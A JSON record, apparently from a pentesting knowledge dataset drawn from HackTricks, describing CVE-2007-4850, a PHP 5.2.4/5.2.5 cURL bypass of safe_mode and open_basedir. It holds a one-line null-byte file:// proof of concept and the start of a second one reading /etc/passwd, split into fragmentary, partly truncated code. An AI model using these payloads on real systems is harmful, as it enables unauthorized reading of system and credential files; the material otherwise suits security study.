{
  "id": "network_services_pentesting_5b9f13f99e7a",
  "category": "network-services-pentesting",
  "title": "disable functions bypass php 5.2.4 and 5.2.5 php curl",
  "description": "# PHP 5.2.4 and 5.2.5 PHP cURL\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\nThis page documents a legacy but still useful-in-CTFs/local-legacy-installs trick to bypass PHP safe_mode/open_basedir checks using the cURL extension on specific PHP 5.2.x builds.\n\n- Affected: PHP 5.2.4 and 5.2.5 with ext/curl enabled.\n- Impact: Read arbitrary local files despite safe_mode or open_basedir restrictions (no direct code execution).\n- ID: CVE-2007-4850.\n\nFrom http://blog.safebuff.com/2016/05/06",
  "payloads": [
    "# PHP 5.2.4 and 5.2.5 PHP cURL",
    "{{#include ../../../../banners/hacktricks-training.md}}",
    "This page documents a legacy but still useful-in-CTFs/local-legacy-installs trick to bypass PHP safe_mode/open_basedir checks using the cURL extension on specific PHP 5.2.x builds.",
    "- Affected: PHP 5.2.4 and 5.2.5 with ext/curl enabled.",
    "- Impact: Read arbitrary local files despite safe_mode or open_basedir restrictions (no direct code execution).",
    "- ID: CVE-2007-4850.",
    "From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/",
    "## One-liner PoC",
    "If safe_mode or open_basedir are active and cURL is enabled, the following will return the contents of the current script:",
    "```php",
    "var_dump(curl_exec(curl_init(\"file://safe_mode_bypass\\x00\".__FILE__)));",
    "## More explicit PoC (arbitrary file read)",
    "```php",
    "// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded",
    "$target = '/etc/passwd'; // change to the file you want to read"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md"
  ]
}